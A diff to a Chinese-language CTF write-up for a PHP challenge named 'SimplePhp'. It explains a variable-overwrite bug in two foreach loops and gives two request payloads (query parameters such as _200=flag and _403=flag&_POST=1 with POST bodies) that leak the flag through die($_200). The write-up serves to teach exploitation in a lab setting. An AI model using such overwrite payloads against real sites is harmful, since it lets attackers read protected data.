@@ -20,11 +20,20 @@ die($_200);
 ```
 
 # Solution 
+有很明显的变量覆盖漏洞。要求我们在post语句中有flag，同时在第二个foreach中有把`$flag`直接覆盖了，所以直接通过echo语句输出的flag是被修改过的。接着看看有什么输出点，比如有个`die($_200)`，结合第一个foreach的功能，我们可以在第二个foreach之前先将`$_200`的值覆盖为原flag的值。
+
 payload:
 ```
 http://34.253.165.46/SimplePhp/index.php?_200=flag
 POST:
 flag=1
+```
+
+payload2:
+```
+http://34.253.165.46/SimplePhp/index.php?_403=flag&_POST=1
+POST:
+flag=
 ```
 
 # Refference
